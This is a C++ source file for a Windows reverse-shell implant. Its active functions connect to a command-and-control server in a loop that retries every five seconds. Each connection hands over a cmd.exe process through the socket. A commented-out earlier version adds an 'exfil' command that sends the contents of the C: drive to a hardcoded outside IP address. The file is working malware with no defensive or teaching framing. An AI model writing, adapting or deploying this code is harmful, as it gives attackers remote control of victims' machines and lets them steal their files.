#include "ReverseShell.h"
#include "exfiltrator.h"
#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <cstring>
#include <cstdlib>

#pragma comment(lib, "Ws2_32.lib")

#define DEFAULT_BUFLEN 1024
// void RunShell(const char* C2Server, int C2Port) {
//     SOCKET mySocket;
//     sockaddr_in addr;
//     WSADATA version;

//     if (WSAStartup(MAKEWORD(2, 2), &version) != 0) return;

//     mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
//     if (mySocket == INVALID_SOCKET) {
//         WSACleanup();
//         return;
//     }

//     addr.sin_family = AF_INET;
//     addr.sin_addr.s_addr = inet_addr(C2Server);
//     addr.sin_port = htons(C2Port);

//     if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
//         closesocket(mySocket);
//         WSACleanup();
//         return;
//     }

//     char RecvData[DEFAULT_BUFLEN] = {0};

//     // Keep listening for commands
//     while (true) {
//         memset(RecvData, 0, sizeof(RecvData)); // Clear buffer for new data
//         int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
//         if (RecvCode <= 0) break; // Exit if connection is lost

//         // Trim and handle command
//         std::string command(RecvData);
//         command.erase(command.find_last_not_of(" \n\r\t") + 1);

//         if (command == "exfil") {
//             std::string directoryPath = "C:\\";
//             std::string targetURL = "http://64.94.85.32:7006";
//             try {
//                 ManualDataExfil(directoryPath, targetURL);
//                 send(mySocket, "Data exfiltration completed.\n", 29, 0);
//             } catch (const std::exception& e) {
//                 std::string errorMessage = "Exfiltration failed: " + std::string(e.what()) + "\n";
//                 send(mySocket, errorMessage.c_str(), errorMessage.size(), 0);
//             }
//         } else if (command == "exit") {
//             send(mySocket, "Exiting.\n", 9, 0);
//             break; // Exit the loop
//         } else {
//             send(mySocket, "Invalid command. Waiting for next command.\n", 41, 0);
//         }
//     }

//     // Clean up and exit
//     closesocket(mySocket);
//     WSACleanup();
// }

void RunShell(const char* C2Server, int C2Port) {
    while (true) {
        Sleep(5000);  // Wait for 5 seconds before reconnecting

        SOCKET mySocket;
        sockaddr_in addr;
        WSADATA version;

        // Initialize Winsock
        if (WSAStartup(MAKEWORD(2, 2), &version) != 0) {
            continue;
        }

        // Create a socket
        mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        if (mySocket == INVALID_SOCKET) {
            WSACleanup();
            continue;
        }

        // Configure the server address
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr(C2Server);
        addr.sin_port = htons(C2Port);

        // Attempt to connect to the C2 server
        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }

        // Receive data from the C2 server
        char RecvData[DEFAULT_BUFLEN] = {0};
        int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
        if (RecvCode <= 0) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }

        // Spawn the reverse shell
        wchar_t Process[] = L"cmd.exe";
        STARTUPINFOW sinfo;
        PROCESS_INFORMATION pinfo;

        memset(&sinfo, 0, sizeof(sinfo));
        sinfo.cb = sizeof(sinfo);
        sinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;

        if (!CreateProcessW(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo)) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }

        // Wait for the process to complete
        WaitForSingleObject(pinfo.hProcess, INFINITE);
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);

        // Check for exit command
        memset(RecvData, 0, sizeof(RecvData));
        RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
        if (RecvCode <= 0 || strcmp(RecvData, "exit\n") == 0) {
            closesocket(mySocket);
            WSACleanup();
            break;
        }
    }
}

// Function to attempt reconnection to the listener
void ReconnectToListener(const char* C2Server, int C2Port) {
    while (true) {
        Sleep(5000);  // Wait for 5 seconds before reconnecting

        SOCKET mySocket;
        sockaddr_in addr;
        WSADATA version;

        // Initialize Winsock
        if (WSAStartup(MAKEWORD(2, 2), &version) != 0) {
            // std::cerr << "[ERROR] WSAStartup failed. Retrying..." << std::endl;
            continue;
        }

        // Create a socket
        mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        if (mySocket == INVALID_SOCKET) {
            // std::cerr << "[ERROR] Failed to create socket. Retrying..." << std::endl;
            WSACleanup();
            continue;
        }

        // Configure the server address
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr(C2Server);
        addr.sin_port = htons(C2Port);

        // Attempt to connect to the listener
        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            // std::cerr << "[ERROR] Connection failed. Retrying..." << std::endl;
            closesocket(mySocket);
            WSACleanup();
            continue;
        }

        // std::cout << "[INFO] Connected to C2 server." << std::endl;

        // Spawn the reverse shell
        wchar_t Process[] = L"cmd.exe";
        STARTUPINFOW sinfo;
        PROCESS_INFORMATION pinfo;

        memset(&sinfo, 0, sizeof(sinfo));
        sinfo.cb = sizeof(sinfo);
        sinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;

        if (!CreateProcessW(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo)) {
            // std::cerr << "[ERROR] Failed to create process. Retrying..." << std::endl;
            closesocket(mySocket);
            WSACleanup();
            continue;
        }

        // Wait for the process to complete
        WaitForSingleObject(pinfo.hProcess, INFINITE);
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);

        // std::cerr << "[INFO] Connection lost. Attempting to reconnect..." << std::endl;

        // Clean up before the next attempt
        closesocket(mySocket);
        WSACleanup();
    }
}